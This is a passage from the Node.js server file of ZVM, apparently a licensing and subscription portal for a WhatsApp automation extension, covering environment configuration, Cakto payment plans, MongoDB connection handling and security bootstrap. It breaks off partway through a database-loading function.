const ZVM_BUILD_ID = '2026-10-08-r46-16-cakto-queue-recovery';
const { resolveClientIp } = require('./client-ip-policy');
const { createLandingRenderer } = require('./src/web/public/landing/render');
const { renderOwnerSalesLanding, OWNER_TOP_BRAND_SRC } = require('./src/web/public/landing/owner');
const { renderPublicFooter } = require('./src/web/public/footer');
const { TERMS, renderTermsDocument } = require('./src/web/public/terms');
const { SUPPORT_URL: ZVM_SUPPORT_URL } = require('./src/support-contact');
const { resolvePublicLocale, localizePublicHtml, localizeAuthHtml, setLanguageCookie } = require('./src/web/public/i18n');
'use strict';

function sanitizeStartupErrorMessage(error) {
  let message = error && typeof error === 'object' && typeof error.message === 'string'
    ? error.message
    : (typeof error === 'string' ? error : 'STARTUP_FAILED');
  message = String(message || 'STARTUP_FAILED').slice(0, 1200);
  message = message.replace(/\b([a-z][a-z0-9+.-]*:\/\/)[^\s\/@]+(?::[^\s\/@]*)?@/gi, '$1<redacted>@');
  message = message.replace(/\b(password|passwd|pwd|token|secret|api[_-]?key)=([^\s&;,]+)/gi, '$1=<redacted>');
  return message || 'STARTUP_FAILED';
}

const http   = require('http');
const https  = require('https');
const crypto = require('crypto');
const fs     = require('fs');
const path   = require('path');
const zlib   = require('zlib');
const { serveSSX2012 } = require('./src/hobbies/ssx/route');
const { createCloudRoute } = require('./src/web/cloud/route');
// ZVM Cloud shares the portal login but never reuses ADMIN_PASS, portal passwords,
// or the extension's commercial license writes. DEV authorization is revalidated
// against current, persisted license status on every privileged Cloud request.
const serveZVMCloud = createCloudRoute({
  resolvePortal: async (req) => {
    if (!isPortalSession(req)) return null; // includes completed portal 2FA
    const session = getPortalUser(req);
    const match = String(req.headers.cookie || '').match(/(?:^|;\s*)zv_portal=([a-f0-9]{64})(?:;|$)/);
    if (!session || !match || !session.email) return null;
    const db = await getMongoDb();
    const user = await db.collection('portal_users').findOne(
      { _id: String(session.email).toLowerCase() },
      { projection: { _id: 1, banned: 1, verified: 1 } }
    );
    if (!user || user.banned === true) return null;
    return {
      email: String(session.email).toLowerCase(),
      sessionId: crypto.createHash('sha256').update(match[1]).digest('hex'),
      expiresAt: new Date(session.expiresAt).getTime(),
    };
  },
  verifyDevKey: async (email, rawCode, storedKeyHash) => {
    const db = await getMongoDb();
    const user = await db.collection('portal_users').findOne(
      { _id: email },
      { projection: { keyCode: 1, banned: 1 } }
    );
    if (!user || user.banned === true) return false;
    const keyCode = String(user.keyCode || '').trim().toLowerCase();
    if (!/^[a-z0-9_-]{1,64}$/.test(keyCode)) return false;
    if (rawCode !== null && !safeCompare(keyCode, rawCode)) return false;
    const fingerprint = crypto.createHash('sha256').update(keyCode).digest('hex');
    if (storedKeyHash !== null && !safeCompare(fingerprint, storedKeyHash)) return false;
    // Read the authoritative DB record, never the in-memory cache of old licenses.
    const record = await readPortalKeySnapshot(keyCode, { db });
    if (!extensionLicenseIsUsable(record) || !extensionDevAccessAllowed(keyCode, record)) return false;
    return rawCode !== null ? { keyHash: fingerprint } : true;
  },
});
const net    = require('net');
const { MongoClient } = require('mongodb');
// Fonte de configuração:
// - Render: usa somente Environment Variables injetadas pelo provedor.
// - Local: zvm.env é obrigatório e resolvido ao lado do server.js (ou pelo
//   DOTENV_CONFIG_PATH explícito do launcher). O server.js em si é o mesmo
//   candidato usado localmente e em produção; segurança local vem do ambiente.
const ZVM_RENDER_RUNTIME = /^(1|true|yes|on)$/i.test(String(process.env.RENDER || '').trim());
const ZVM_ENV_PATH = process.env.DOTENV_CONFIG_PATH
  ? path.resolve(process.env.DOTENV_CONFIG_PATH)
  : path.resolve(__dirname, 'zvm.env');
if (!ZVM_RENDER_RUNTIME) {
  if (!fs.existsSync(ZVM_ENV_PATH)) {
    console.error('❌ ERRO CRÍTICO: zvm.env não foi encontrado para execução local.');
    console.error('   Copie o seu zvm.env real ao lado do server.js e inicie pelo launcher local.');
    process.exit(1);
  }
  try {
    const dotenvResult = require('dotenv').config({ path: ZVM_ENV_PATH });
    if (dotenvResult && dotenvResult.error) throw dotenvResult.error;
    console.log('[ZVM LOCAL] zvm.env carregado:', ZVM_ENV_PATH);
  } catch (error) {
    console.error('❌ ERRO CRÍTICO: falha ao carregar zvm.env:', sanitizeStartupErrorMessage(error));
    process.exit(1);
  }
  if (!/^(1|true|yes|on)$/i.test(String(process.env.ZVM_LOCAL_SAFE_MODE || '').trim())) {
    console.error('❌ ERRO CRÍTICO: execução local exige ZVM_LOCAL_SAFE_MODE=1.');
    console.error('   Use INICIAR_ZVM_SITE_LOCAL.bat para aplicar o overlay seguro sem alterar o server.js.');
    process.exit(1);
  }
}
const {
  sendPasswordResetEmail, sendKeyDeliveryEmail, sendKeyExpiryWarningEmail, sendEmail,
  buildPasswordResetEmail, buildKeyDeliveryEmail, buildKeyExpiryWarningEmail, prepareKeyDeliveryArtwork,
} = require('./mailer');
const { decorativeSlices: zvmEmailArtSlices } = require('./src/email-pixel-fidelity');
const {
  createBuildAuthority,
  parseBuildMap: zvmSecurityBuildMap,
  mergeBuildMaps: zvmSecurityMergeBuildMaps,
  hashSet: zvmSecurityHashSet,
  loadRegistryV2: zvmSecurityLoadRegistryV2,
} = require('./build-authority');
const { validateRuntimeSecurityConfig } = require('./runtime-config');
const { loadDevBuildSigningConfig, createDevBuildSigningService } = require('./dev-build-signing');
const { resolveExtensionCorsOrigin } = require('./extension-origin-policy');
const { checkoutUrlForPortal, readCheckoutBinding, isZvmCheckoutBinding } = require('./src/cakto-checkout-binding');
const { resolveSubscriptionCheckout } = require('./src/cakto-renewal-binding-resolver');
const { getScopedToken } = require('./src/cakto-paid-order-audit');
const { runMissingRenewalPass } = require('./src/cakto-auto-recovery');
const { displayLicensePlan } = require('./src/commercial-plan-labels');
const { readNewCatalog } = require('./src/commercial-public-catalog');
const {
  LegacyV3Shield,
  legacyKeyStateSignature,
  legacyReloginCacheKey,
} = require('./legacy-v3-shield');

const PORT         = process.env.PORT         || 3000;
const ADMIN_USER   = process.env.ADMIN_USER;
const ADMIN_PASS   = process.env.ADMIN_PASS;

const CAKTO_WEBHOOK_SECRET = process.env.CAKTO_WEBHOOK_SECRET || '';
const CAKTO_READONLY_CLIENT_ID = process.env.CAKTO_READONLY_CLIENT_ID || '';
const CAKTO_READONLY_CLIENT_SECRET = process.env.CAKTO_READONLY_CLIENT_SECRET || '';
const CAKTO_SIGNATURE_TOLERANCE_SECONDS = Math.max(60, Math.min(900, parseInt(process.env.CAKTO_SIGNATURE_TOLERANCE_SECONDS || '300', 10) || 300));
const CAKTO_WORKER_POLL_MS = Math.max(1000, Math.min(60000, parseInt(process.env.CAKTO_WORKER_POLL_MS || '5000', 10) || 5000));
const CAKTO_WORKER_LEASE_MS = Math.max(30000, Math.min(10 * 60 * 1000, parseInt(process.env.CAKTO_WORKER_LEASE_MS || '120000', 10) || 120000));
const CAKTO_WORKER_MAX_ATTEMPTS = Math.max(1, Math.min(20, parseInt(process.env.CAKTO_WORKER_MAX_ATTEMPTS || '8', 10) || 8));
const CAKTO_WORKER_BATCH = Math.max(1, Math.min(25, parseInt(process.env.CAKTO_WORKER_BATCH || '10', 10) || 10));
const CAKTO_EVENT_RETENTION_DAYS = Math.max(7, Math.min(365, parseInt(process.env.CAKTO_EVENT_RETENTION_DAYS || '30', 10) || 30));
const CAKTO_DEAD_LETTER_RETENTION_DAYS = Math.max(CAKTO_EVENT_RETENTION_DAYS, Math.min(730, parseInt(process.env.CAKTO_DEAD_LETTER_RETENTION_DAYS || '90', 10) || 90));
const CAKTO_QUEUE_MAX_ACTIVE = Math.max(100, Math.min(50000, parseInt(process.env.CAKTO_QUEUE_MAX_ACTIVE || '5000', 10) || 5000));
const CAKTO_QUEUE_COUNTER_ID = 'cakto_active';
const CAKTO_MAIL_MAX_ATTEMPTS = Math.max(1, Math.min(20, parseInt(process.env.CAKTO_MAIL_MAX_ATTEMPTS || '8', 10) || 8));
const CAKTO_MAIL_BATCH = Math.max(1, Math.min(25, parseInt(process.env.CAKTO_MAIL_BATCH || '10', 10) || 10));
const CAKTO_MAIL_RETENTION_DAYS = Math.max(7, Math.min(365, parseInt(process.env.CAKTO_MAIL_RETENTION_DAYS || '30', 10) || 30));
const CAKTO_MAIL_DEAD_LETTER_RETENTION_DAYS = Math.max(CAKTO_MAIL_RETENTION_DAYS, Math.min(730, parseInt(process.env.CAKTO_MAIL_DEAD_LETTER_RETENTION_DAYS || '90', 10) || 90));
const WORKER_LOCK_RETENTION_MS = Math.max(60 * 60 * 1000, Math.min(7 * 24 * 60 * 60 * 1000, (parseInt(process.env.WORKER_LOCK_RETENTION_HOURS || '24', 10) || 24) * 60 * 60 * 1000));
const COMMERCIAL_LOCK_LEASE_MS = Math.max(30000, Math.min(5 * 60 * 1000, parseInt(process.env.COMMERCIAL_LOCK_LEASE_MS || '120000', 10) || 120000));
const COMMERCIAL_LOCK_WAIT_MS = Math.max(0, Math.min(15000, parseInt(process.env.COMMERCIAL_LOCK_WAIT_MS || '5000', 10) || 5000));
const COMMERCIAL_LOCK_HEARTBEAT_MS = Math.max(5000, Math.min(60000, parseInt(process.env.COMMERCIAL_LOCK_HEARTBEAT_MS || String(Math.max(10000, Math.floor(COMMERCIAL_LOCK_LEASE_MS / 3))), 10) || Math.max(10000, Math.floor(COMMERCIAL_LOCK_LEASE_MS / 3))));
const COMMERCIAL_TX_CLAIM_LEASE_MS = Math.max(30000, Math.min(5 * 60 * 1000, parseInt(process.env.COMMERCIAL_TX_CLAIM_LEASE_MS || '120000', 10) || 120000));
const COMMERCIAL_TX_CLAIM_WAIT_MS = Math.max(0, Math.min(15000, parseInt(process.env.COMMERCIAL_TX_CLAIM_WAIT_MS || '5000', 10) || 5000));
const COMMERCIAL_TX_CLAIM_RETENTION_DAYS = Math.max(30, Math.min(730, parseInt(process.env.COMMERCIAL_TX_CLAIM_RETENTION_DAYS || '400', 10) || 400));
const IS_PRODUCTION = String(process.env.NODE_ENV || '').toLowerCase() === 'production' || String(process.env.RENDER || '').toLowerCase() === 'true';
const ZVM_LOCAL_SAFE_MODE = /^(1|true|yes|on)$/i.test(String(process.env.ZVM_LOCAL_SAFE_MODE || '').trim());
// Storefront fails closed if this setting is absent or unrecognized. Owner must explicitly opt in to sales.
// This does not disable Cakto webhooks, existing licenses, or previously paid deliveries.
const ZVM_SALES_PAUSED = !/^(0|false|no|off)$/i.test(String(process.env.ZVM_SALES_PAUSED ?? '').trim());
const ANALYTICS_PASS = process.env.ANALYTICS_PASS || '';
// Opcional: se preenchida, exige TOTP além da senha pra entrar no Analytics
// (mesma implementação de verifyTOTP já usada pro admin — nenhuma lib nova).
// Vazia = compatibilidade total com o comportamento atual (só senha).
const ANALYTICS_TOTP_SECRET = process.env.ANALYTICS_TOTP_SECRET || '';
const MONGODB_URI  = (process.env.MONGODB_URI || '').replace(/^["']|["']$/g, '');
const APP_SECRET   = process.env.APP_SECRET   || '';
const CAKTO_RECOVERY_SECRET = String(process.env.CAKTO_RECOVERY_SECRET || '').trim();
const CAKTO_RECOVERY_SECRET_PREVIOUS = String(process.env.CAKTO_RECOVERY_SECRET_PREVIOUS || '').trim();
const TOTP_SECRET  = process.env.TOTP_SECRET  || '';
const PORTAL_TOTP_ENCRYPTION_KEY = String(process.env.PORTAL_TOTP_ENCRYPTION_KEY || '').trim();
const PORTAL_TOTP_ENCRYPTION_KEY_PREVIOUS = String(process.env.PORTAL_TOTP_ENCRYPTION_KEY_PREVIOUS || '').trim();
const PORTAL_TOTP_MIGRATE_LEGACY = /^(1|true|yes|on)$/i.test(String(process.env.PORTAL_TOTP_MIGRATE_LEGACY || ''));
const PORTAL_TOTP_ENCRYPTED_SENTINEL = '__ZVM_TOTP_ENCRYPTED_V1__';
const CAKTO_ALLOW_DRY_RUN = /^(1|true|yes|on)$/i.test(String(process.env.CAKTO_ALLOW_DRY_RUN || ''));
const WEBHOOK_URL  = process.env.WEBHOOK_URL  || '';
const EXTENSION_URL = process.env.EXTENSION_URL || '';
const EXPIRY_WARN_HOURS = Math.max(1, Math.min(720, parseInt(process.env.EXPIRY_WARN_HOURS || '48') || 48));
const BASE_URL          = (process.env.BASE_URL || 'http://localhost:3000').replace(/\/$/, '');
const RESEND_API_KEY    = process.env.RESEND_API_KEY || '';
const EMAIL_FROM        = process.env.EMAIL_FROM    || 'ZVM <noreply@zvm.app>';
const EXTENSION_VERSION = process.env.EXTENSION_VERSION || '';
const EXTENSION_CHANGELOG = process.env.EXTENSION_CHANGELOG || '';
const EXTENSION_NOTIFICATIONS_JSON = String(process.env.EXTENSION_NOTIFICATIONS_JSON || '').trim();
const EXTENSION_TUTORIALS_JSON = String(process.env.EXTENSION_TUTORIALS_JSON || '').trim();
const EXT_COMPAT_DECODER_V1 = String(process.env.EXT_COMPAT_DECODER_V1 || '').trim();
const TRUST_PROXY_HEADERS = process.env.TRUST_PROXY_HEADERS === '1' || String(process.env.RENDER || '').toLowerCase() === 'true';
const ZVM_EXTENSION_IDS = new Set(String(process.env.ZVM_EXTENSION_IDS || '').split(',').map(v => v.trim().toLowerCase()).filter(v => /^[a-p]{32}$/.test(v)));
const ZVM_LEGACY_SHIELD_CHECK_TTL_MS = Math.max(30000, Math.min(15 * 60 * 1000, parseInt(process.env.ZVM_LEGACY_SHIELD_CHECK_TTL_MS || '300000', 10) || 300000));
const ZVM_LEGACY_SHIELD_KEY_TTL_MS = Math.max(5 * 60 * 1000, Math.min(2 * 60 * 60 * 1000, parseInt(process.env.ZVM_LEGACY_SHIELD_KEY_TTL_MS || '3600000', 10) || 3600000));
const ZVM_LEGACY_SHIELD_MAX_ENTRIES = Math.max(128, Math.min(10000, parseInt(process.env.ZVM_LEGACY_SHIELD_MAX_ENTRIES || '2048', 10) || 2048));
const ZVM_LEGACY_V3_SHIELD = new LegacyV3Shield({
  checkTtlMs: ZVM_LEGACY_SHIELD_CHECK_TTL_MS,
  keyTtlMs: ZVM_LEGACY_SHIELD_KEY_TTL_MS,
  maxEntries: ZVM_LEGACY_SHIELD_MAX_ENTRIES,
});
let _legacyShieldLoggedHits = 0;
function maybeLogLegacyV3Shield() {
  const snap = ZVM_LEGACY_V3_SHIELD.snapshot();
  const hits = snap.checkHits + snap.keyHits;
  if (hits < 1 || (hits !== 1 && hits - _legacyShieldLoggedHits < 250)) return;
  _legacyShieldLoggedHits = hits;
  console.log(
    '[LEGACY-SHIELD] ' +
    'check=' + snap.checkHits + '/' + snap.checkMisses +
    ' key=' + snap.keyHits + '/' + snap.keyMisses +
    ' bypass=' + snap.keyBypasses +
    ' avoidedDbWrites~=' + snap.estimatedDbWritesAvoided +
    ' entries=' + snap.checkEntries + '+' + snap.keyEntries
  );
}
const META_APP_ID = String(process.env.META_APP_ID || '').trim();
const META_APP_SECRET = String(process.env.META_APP_SECRET || '').trim();
const META_CONFIG_ID = String(process.env.META_CONFIG_ID || '').trim();
// Graph API pública: v26.0 em 2026-10-06. O fallback v23.0 fica intencionalmente
// congelado enquanto Meta estiver dormente; promover somente após validação end-to-end.
const META_GRAPH_VERSION = /^v\d+\.\d+$/.test(String(process.env.META_GRAPH_VERSION || '').trim()) ? String(process.env.META_GRAPH_VERSION).trim() : 'v23.0';
const META_WEBHOOK_VERIFY_TOKEN = String(process.env.META_WEBHOOK_VERIFY_TOKEN || '').trim();
const META_TOKEN_ENCRYPTION_KEY = String(process.env.META_TOKEN_ENCRYPTION_KEY || '').trim();
const META_AUTO_REGISTER_PHONE = String(process.env.META_AUTO_REGISTER_PHONE || '1') !== '0';
const META_FLOW_TTL_MS = 12 * 60 * 1000;
const META_WEBHOOK_RETENTION_DAYS = Math.max(1, Math.min(90, parseInt(process.env.META_WEBHOOK_RETENTION_DAYS || '30') || 30));
const META_COLLECTION = 'meta_connections';
const META_FLOW_COLLECTION = 'meta_signup_flows';
const META_WEBHOOK_COLLECTION = 'meta_webhook_events';

// Fonte comercial única do ZVM Standalone. IDs reais podem ser preenchidos
// por ambiente como pinning adicional; enquanto ausentes, o contrato já usado em
// produção continua aceitando checkout oficial ou nome comercial exato + gates
// de status/moeda/preço. Nenhum ID é inferido do slug do checkout.
const ZVM_PLANS = Object.freeze({
  solo: Object.freeze({
    id: 'solo', name: 'ZVM Solo', shortName: 'Solo', price: 39.90,
    maxUses: 1, durationDays: 30,
    checkoutUrl: 'https://pay.cakto.com.br/7kzktq2_1000035',
    offerId: process.env.CAKTO_SOLO_OFFER_ID || '',
    productId: process.env.CAKTO_SOLO_PRODUCT_ID || '',
  }),
  padrao: Object.freeze({
    id: 'padrao', name: 'ZVM Padrão', shortName: 'Padrão', price: 59.90,
    maxUses: 3, durationDays: 30,
    checkoutUrl: 'https://pay.cakto.com.br/spxbb8u_1030568',
    offerId: process.env.CAKTO_PADRAO_OFFER_ID || '',
    productId: process.env.CAKTO_PADRAO_PRODUCT_ID || '',
  }),
  pro: Object.freeze({
    id: 'pro', name: 'ZVM PRO', shortName: 'Pro', price: 94.90,
    maxUses: 5, durationDays: 30,
    checkoutUrl: 'https://pay.cakto.com.br/3ehxsg3_1030569',
    offerId: process.env.CAKTO_PRO_OFFER_ID || '',
    productId: process.env.CAKTO_PRO_PRODUCT_ID || '',
  }),
  empresarial: Object.freeze({
    id: 'empresarial', name: 'ZVM Empresarial', shortName: 'Empresarial', price: 169.90,
    maxUses: 10, durationDays: 30,
    checkoutUrl: 'https://pay.cakto.com.br/eihat4z_1030571',
    offerId: process.env.CAKTO_EMPRESARIAL_OFFER_ID || '',
    productId: process.env.CAKTO_EMPRESARIAL_PRODUCT_ID || '',
  }),
});

// The public offers reuse the original Cakto products at their exact historical
// prices and limits. Never change provider IDs or real licensing contracts to
// accommodate a presentation rename (Padrão -> START).
const ZVM_CONFIGURED_V2_PLANS = readNewCatalog(process.env);
const ZVM_PUBLIC_PLANS = Object.freeze({
  solo: Object.freeze({ ...ZVM_PLANS.solo, shortName: 'SOLO', subtitle: 'Uso individual', enabled: true }),
  padrao: Object.freeze({ ...ZVM_PLANS.padrao, shortName: 'START', subtitle: 'Até 3 números de WhatsApp', enabled: true }),
  pro: Object.freeze({ ...ZVM_PLANS.pro, shortName: 'PRO', subtitle: 'Até 5 números de WhatsApp', enabled: true }),
  enterprise_v2: ZVM_CONFIGURED_V2_PLANS.enterprise_v2,
});
// Preserve resolution of pre-existing v2 Cakto contracts even while offering
// historical pricing on the public page.
const ZVM_PAYMENT_PLANS = Object.freeze({
  ...ZVM_PLANS,
  ...Object.fromEntries(Object.entries(ZVM_CONFIGURED_V2_PLANS).filter(([,p]) => p.enabled))
});

const LOG_RETENTION_DAYS = Math.max(1, parseInt(process.env.LOG_RETENTION_DAYS || '90') || 90);

const LOG_MAX = Math.min(parseInt(process.env.LOG_MAX || '500'), 2000);

if (!ADMIN_USER || !ADMIN_PASS) {
  console.error('❌ ERRO CRÍTICO: Defina ADMIN_USER e ADMIN_PASS nas variáveis de ambiente.');
  process.exit(1);
}
if (!MONGODB_URI) {
  console.error('❌ ERRO CRÍTICO: Defina MONGODB_URI nas variáveis de ambiente.');
  process.exit(1);
}
if (!ZVM_EXTENSION_IDS.size && !IS_PRODUCTION) {
  console.warn('[SEC] ZVM_EXTENSION_IDS vazio em desenvolvimento — configure a allowlist antes de ativar ZVM_BUILD_ENFORCE.');
}

const FULL_PERMISSIONS = [
  'create_flow','massive_dispatching','schedule_item',
  'send_flow','send_funnel','send_trigger','zapsaver'
];
const USAGE_LIMITS = {
  audio:        { sent:0, max:-1 }, bulkMessages: { sent:0, max:-1 },
  document:     { sent:0, max:-1 }, flow:         { sent:0, max:-1 },
  funnel:       { sent:0, max:-1 }, media:        { sent:0, max:-1 },
  message:      { sent:0, max:-1 }, scheduleItem: { sent:0, max:-1 },
  zapsaver:     { sent:0, max:-1 },
};
const FREE_AUTH_KEY   = 'free';
const FREE_PLAN_ID    = 'ZV_FREE';
const FREE_OWNER_ID   = '6a6d6a86-6bc6-4359-ad49-05639915e368';
const FREE_MANAGER_ID = 'zv-free-manager';
const FREE_KEY_ID     = 'id-free';
const PAID_USAGE_KEY  = '__paid__';
const FREE_USAGE_LIMITS = {
  audio: { sent: 0, max: 10 }, bulkMessages: { sent: 0, max: 0 },
  document: { sent: 0, max: 10 }, flow: { sent: 0, max: 0 },
  funnel: { sent: 0, max: 0 }, media: { sent: 0, max: 10 },
  message: { sent: 0, max: 20 }, scheduleItem: { sent: 0, max: 5 },
  zapsaver: { sent: 0, max: 0 },
};
const AUTH_MSG = {
  BLOCKED: 'CHAVE BLOQUEADA',
  EXPIRED: 'CHAVE EXPIRADA',
  USER_NOT_FOUND: 'USUÁRIO NÃO ENCONTRADO',
};
const USAGE_ITEM_TYPES = [
  'audio', 'document', 'media', 'message', 'flow', 'funnel',
  'bulkMessages', 'scheduleItem', 'zapsaver',
];
const MONGODB_DB = (() => {
  const fromEnv = (process.env.MONGODB_DB || '').trim();
  if (fromEnv) {
    if (fromEnv.toLowerCase() !== 'zapvoice')
      console.warn(`[DB] MONGODB_DB="${fromEnv}" — suas chaves estao em "zapvoice" (Atlas).`);
    return fromEnv;
  }
  return 'zapvoice';
})();
const MAX_USES = 3;
const MAX_PHONES_GLOBAL = Math.max(1, parseInt(process.env.MAX_PHONES_GLOBAL || '50') || 50);
const AVAILABLE_MODULES = ['zapSaver'];
const DEFAULT_MODULES = Object.fromEntries(AVAILABLE_MODULES.map(m => [m, false]));

let _mongoClient = null;
let _mongoDb     = null;
let _mongoConnectPromise = null;
let _caktoIndexReady = false;
let _adminPortalUsersCache = { ts: 0, users: [] };

async function loadAdminPortalUsers({ limit = 1000 } = {}) {
  try {
    const db = await getMongoDb();
    const users = await db.collection('portal_users').find({}, {
      projection: { _id:1, name:1, displayName:1, phone:1, keyCode:1, createdAt:1, lastLogin:1, banned:1, verified:1 }
    }).sort({ createdAt: -1 }).limit(Math.max(1, Math.min(2000, Number(limit)||1000))).toArray();

    let sourceKeys = {};
    if (users.some(u => typeof u.keyCode === 'string' && u.keyCode && !keys[u.keyCode])) {
      const keyDoc = await db.collection('store').findOne({ _id:'keys' }, { projection:{ data:1 } });
      sourceKeys = keyDoc?.data && typeof keyDoc.data === 'object' ? keyDoc.data : {};
    }

    const enriched = users.map(u => {
      const code = typeof u.keyCode === 'string' ? u.keyCode : '';
      const k = code ? (keys[code] || sourceKeys[code] || null) : null;
      const plan = k ? displayLicensePlan({ planId: k.planId || k.plan_id || k.plan, planLabel: k.planName, maxUses: k.maxUses }).label : null;
      return {
        _id: String(u._id || ''), name: u.name || '', displayName: u.displayName || '', phone: u.phone || '',
        keyCode: code, createdAt: u.createdAt || null, lastLogin: u.lastLogin || null,
        banned: !!u.banned, verified: u.verified !== false, plan
      };
    });
    _adminPortalUsersCache = { ts: Date.now(), users: enriched };
    return { ok: true, users: enriched, stale: false };
  } catch (e) {
    console.error('[ADMIN] portal-users:', e.message);
    if (_adminPortalUsersCache.users.length) return { ok: true, users: _adminPortalUsersCache.users, stale: true, warning: 'db_temporarily_unavailable' };
    return { ok: false, users: [], stale: false, error: 'db_error', retryable: true };
  }
}

// Retomada de eventos Cakto (P0) — um registro "processing" só é considerado
// travado/abandonado depois desse tempo sem avanço (lastAttemptAt). 5min é
// generoso o bastante pra qualquer processamento real (Mongo + e-mail, tudo
// em milissegundos a poucos segundos) já ter terminado, e curto o bastante
// pra não bloquear os próprios reenvios da Cakto (que chegam em minutos/
// horas) por muito tempo caso o processo tenha realmente caído no meio.
const CAKTO_PROCESSING_STALE_MS = 5 * 60 * 1000;

async function getMongoDb() {
  if (_mongoDb) return _mongoDb;
  // Uma única tentativa é compartilhada por todas as rotas. Antes, cada
  // concorrente aguardava em polling de até 10s, inclusive após falha.
  if (_mongoConnectPromise) return _mongoConnectPromise;
  const pending = (async () => {
    const stale = _mongoClient;
    _mongoClient = null;
    if (stale) Promise.resolve().then(() => stale.close()).catch(() => {});
    const client = new MongoClient(MONGODB_URI, {
      serverSelectionTimeoutMS: 6000,
      connectTimeoutMS:         6000,
      socketTimeoutMS:          30000,
      maxPoolSize:              10,
      minPoolSize:              1,
      maxIdleTimeMS:            60000,
      waitQueueTimeoutMS:       10000,
      tls:                      true,
      tlsAllowInvalidCertificates: false,
      tlsAllowInvalidHostnames:    false,
      compressors:              ['zstd', 'zlib'],
    });
    try {
      await client.connect();
      _mongoClient = client;
      _mongoDb = client.db(MONGODB_DB);
      console.log('✅ MongoDB conectado');
      return _mongoDb;
    } catch (error) {
      client.close().catch(() => {});
      throw error;
    }
  })();
  _mongoConnectPromise = pending;
  try { return await pending; }
  finally { if (_mongoConnectPromise === pending) _mongoConnectPromise = null; }
}

function zvmInvalidateMongoOnNetworkError(error, expectedDb) {
  const code = String(error && error.name || '');
  const message = String(error && error.message || '');
  if (!(/MongoNetwork|MongoServerSelection|MongoOperationTimeout|MongoTimeout/i.test(code) ||
        /timed out|connection.*closed|ECONNRESET|ECONNREFUSED|server selection/i.test(message))) return false;
  // Uma operação antiga não deve derrubar uma conexão nova já recuperada.
  if (!_mongoDb || _mongoDb !== expectedDb) return false;
  const stale = _mongoClient;
  _mongoDb = null;
  _mongoClient = null;
  if (stale) Promise.resolve().then(() => stale.close()).catch(() => {});
  console.warn('[DB] Conexão invalidada após falha de rede; próxima operação reconecta');
  return true;
}

// Health check periódico — detecta queda de conexão sem pingar no hot path
setInterval(async () => {
  if (!_mongoDb) return;
  const checkedDb = _mongoDb;
  try { await checkedDb.command({ ping: 1 }, { timeoutMS: 4000 }); }
  catch (error) {
    if (checkedDb === _mongoDb) {
      const stale = _mongoClient;
      _mongoDb = null; _mongoClient = null;
      if (stale) Promise.resolve().then(() => stale.close()).catch(() => {});
      console.warn('[DB] Ping falhou; próxima operação reconecta');
    }
  }
}, 5 * 60 * 1000).unref();

async function loadDb(opts = {}) {
  try {
    const db = await (opts.getDb || getMongoDb)();
    // Garante índices úteis (idempotente — não recria se já existe)
    db.collection('admin_audit_logs').createIndex({ ts: -1 }, { background: true }).catch(() => {});
    db.collection('portal_users').createIndex({ keyCode: 1 }, { background: true }).catch(() => {});
    if (!ZVM_LOCAL_SAFE_MODE) {
      db.collection('password_resets').createIndex(
        { expiresAt: 1 },
        { expireAfterSeconds: 0, background: true, name: 'password_reset_ttl' }
      ).catch(e => console.error('[SEC] Falha ao garantir TTL de password_resets:', e.message));
    }
    db.collection('extension_security_replay').createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0, background: true }).catch(e => {
      console.error('[SEC] Falha ao garantir TTL de anti-replay compartilhado:', e.message);
    });
    try {
      if (ZVM_LOCAL_SAFE_MODE) {
        _caktoIndexReady = false;
      } else {
        await db.collection('webhook_events').createIndex({ eventKey: 1 }, { unique: true, background: true });
      await db.collection('webhook_events').createIndex({ queueRef: 1 }, { unique: true, sparse: true, background: true });
      await db.collection('webhook_events').createIndex({ status: 1, nextAttemptAt: 1, createdAt: 1 }, { background: true });
      await db.collection('webhook_events').createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0, background: true });
      await db.collection('commercial_tx_claims').createIndex({ state: 1, leaseUntil: 1, updatedAt: 1 }, { background: true });
      await db.collection('commercial_tx_claims').createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0, background: true });
      await db.collection('worker_locks').createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0, background: true });
      await db.collection('payments').createIndex({ txNamespace: 1, txId: 1, approved: 1 }, { background: true });
      await db.collection('payments').createIndex({ subscriptionId: 1, paidAt: -1 }, { background: true });
      await db.collection('payments').createIndex({ commercialTxKey: 1 }, { unique: true, sparse: true, background: true });
      await db.collection('cakto_mail_outbox').createIndex({ status: 1, nextAttemptAt: 1, createdAt: 1 }, { background: true });
      await db.collection('cakto_mail_outbox').createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0, background: true });
      await backfillCaktoQueueRefs(db);
      await backfillCaktoQueuePayloads(db);
      await backfillCaktoPaymentTxKeys(db);
      await reconcileCaktoQueueCounter(db);
      if (CAKTO_WEBHOOK_SECRET) await assertCaktoQueueTransactionReady(db);
      _caktoIndexReady = true;
      }
    } catch (e) {
      _caktoIndexReady = false;
      console.error('[CAKTO] Falha ao preparar autoridade durável:', safeScalar(e?.code || e?.message, 100, 'queue_prepare_failed'));
      if (IS_PRODUCTION && CAKTO_WEBHOOK_SECRET) throw e;
    }
    const [keysDoc, logsDoc, alertsDoc, settingsDoc, rateBlocksDoc] = await Promise.all([
      db.collection('store').findOne({ _id: 'keys' }),
      db.collection('store').findOne({ _id: 'logs' }),
      db.collection('security_alerts').findOne({ _id: 'alerts' }),
      db.collection('settings').findOne({ _id: 'main' }),
      db.collection('rate_blocks').findOne({ _id: 'blocks' }),
    ]);
    const keyCount = keysDoc?.data ? Object.keys(keysDoc.data).length : 0;
    if (keyCount === 0) {
      console.warn(`[DB] Nenhuma chave em zapvoice.store (doc _id:"keys"). Verifique Atlas ou permissao do usuario.`);
    }
    // Restaurar blacklist de IPs em forma canônica para que IPv4-mapped/IPv6
    // não criem entradas equivalentes com representações diferentes.
    if (Array.isArray(settingsDoc?.ipBlacklist)) {
      replaceIpBlacklist(settingsDoc.ipBlacklist);
      console.log(`[BOOT] IP blacklist: ${ipBlacklist.size} entrada(s)`);
    }
    // Restaurar blocos de rate limit ativos
    const now = Date.now();
    if (rateBlocksDoc?.data && typeof rateBlocksDoc.data === 'object') {
      for (const [k, e] of Object.entries(rateBlocksDoc.data)) {
        // Migration from the old shared extension bucket. Those entries were
        // created before V3/V4/legacy authentication were isolated and can
        // otherwise make the first activation after a deploy look rate-limited.
        if (String(k).endsWith(':ext_key')) continue;
        if (e.blockedUntil > now) {
          rateLimitMap.set(k, { count: e.count || 999, resetAt: e.resetAt || now, blockedUntil: e.blockedUntil });
        }
      }
    }
    return {
